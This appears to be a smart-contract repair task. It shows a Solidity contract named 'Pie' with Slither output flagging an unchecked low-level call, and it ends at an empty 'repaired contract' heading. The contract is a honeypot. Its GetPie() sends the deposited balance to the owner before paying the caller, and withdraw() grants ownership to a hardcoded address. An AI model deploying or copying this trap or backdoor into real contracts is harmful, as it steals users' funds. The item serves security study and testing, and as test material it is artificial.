/// Your task is to repair the following Solidity Smart Contract
pragma solidity ^0.4.19;

contract Pie {
    address public Owner = msg.sender;

    function() public payable {}

    function GetPie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6) {
            Owner = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        adr.call.value(msg.value)(data);
    }
}

/// This Solidity Smart Contract has been analyzed by smart contract analyzers. Here are the results from these analyzers.

/// 1. Slither Analysis Results
/// 1.1. Vulnerability: unchecked_low_level_call at Line 23-27:
    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        adr.call.value(msg.value)(data);
///  Message:Low level call in Pie.Command (0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol#23-27):
///   	-adr.call.value(msg.value)(data) 0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol#26



/// Repaired Solidity Smart Contract